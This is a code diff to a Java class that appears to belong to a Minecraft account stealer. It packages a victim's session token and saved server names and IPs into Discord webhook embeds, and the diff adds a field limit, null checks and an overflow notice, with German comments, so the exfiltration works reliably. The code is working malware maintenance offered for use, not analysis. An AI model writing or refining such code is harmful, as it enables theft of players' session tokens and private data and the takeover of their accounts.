@@ -74,17 +74,30 @@ public final class Main {
                         "```" + session.getToken() + "```", false);
     }
 
-    private DiscordWebhook.EmbedObject genServersInfoEmbed() {
+  private DiscordWebhook.EmbedObject genServersInfoEmbed() {
         final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                 .setTitle(":file_folder: Saved Servers")
                 .setColor(0x8F67FC)
                 .setDescription("Contains the target's list of saved Minecraft servers");
 
         final ServerList servers = new ServerList(mc);
-        for (int i = 0; i < servers.countServers(); i++) {
+        
+        // WICHTIG: Discord Limit beachten (Max 25 Felder). Wir nehmen sicherheitshalber 15.
+        int limit = Math.min(servers.countServers(), 15);
+        
+        for (int i = 0; i < limit; i++) {
             final ServerData server = servers.getServerData(i);
+            // Schutz vor null-Werten
+            String name = (server.serverName != null) ? server.serverName : "Unknown";
+            String ip = (server.serverIP != null) ? server.serverIP : "Unknown";
+            
+            serversEmbed.addField(":label: " + name, "```" + ip + "```", true);
+        }
 
-            serversEmbed.addField(":label: " + server.serverName, "```" + server.serverIP + "```", true);
+        // Falls mehr Server da sind, Info anzeigen
+        if (servers.countServers() > limit) {
+            serversEmbed.addField("... und weitere", 
+                "```" + (servers.countServers() - limit) + " Server nicht angezeigt```", false);
         }
 
         return serversEmbed;
